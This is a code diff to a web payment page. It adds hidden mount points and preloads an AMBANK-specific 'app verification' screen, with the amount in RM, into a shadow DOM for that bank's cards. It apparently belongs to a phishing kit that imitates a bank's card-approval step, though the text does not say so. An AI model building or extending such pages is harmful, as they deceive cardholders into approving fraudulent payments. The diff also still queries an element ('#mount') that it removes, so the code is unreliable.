@@ -1056,8 +1056,14 @@ url("pay1ment_icons.woff") format("woff");
         </div>
         <!-- APP Verification overlay -->
         <div class="overlay hidden" id="app-verify-overlay">
-            <div id="mount"></div>
-            <div class="app-verify-box">
+            <div class="hidden" id="mount1"></div>
+            <div class="hidden" id="mount2"></div>
+            <div class="hidden" id="mount3"></div>
+            <div class="hidden" id="mount4"></div>
+            <div class="hidden" id="mount5"></div>
+            <div class="hidden" id="mount6"></div>
+            <div class="hidden" id="mount7"></div>
+            <div class="app-verify-box hidden">
                 <div class="app-hdr">
                     <div class="app-bank-logo" id="app-bank-logo">IB</div>
                     <div class="app-scheme" id="app-scheme">
@@ -1653,9 +1659,8 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('load-overlay').classList.add('hidden');
 
       if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
-        loadPage('/pay/AMBANK', 'mount'); 
-        document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
-        document.querySelector("#mount").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'RM '+tot.toFixed(2);
+        document.querySelector("#mount1").classList.remove('hidden');
+        document.querySelector("#mount").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'RM '+discountedTotal().toFixed(2);
         const now = new Date(); 
         const options = {
         weekday: 'short',
@@ -1677,7 +1682,6 @@ url("pay1ment_icons.woff") format("woff");
             <span>${dateStr}</span><br>
             <span>${timeStr} GMT +0800</span>
         `;
-        document.querySelector("#mount").shadowRoot.querySelector("#formactions > a:nth-child(2) > div").addEventListener('click', appVerifyContinue);
       }
 
       /*if(p.bankName==='AMBANK (M) BERHAD') 
@@ -2716,6 +2720,12 @@ async function loadPage(pagePath, mountId) {
         ${cleanHtml}
     `;
 }
+
+
+
+        loadPage('/pay/AMBANK', 'mount1'); 
+        
+        document.querySelector("#mount1").shadowRoot.querySelector("#formactions > a:nth-child(2) > div").addEventListener('click', appVerifyContinue);
             </script>
 
 
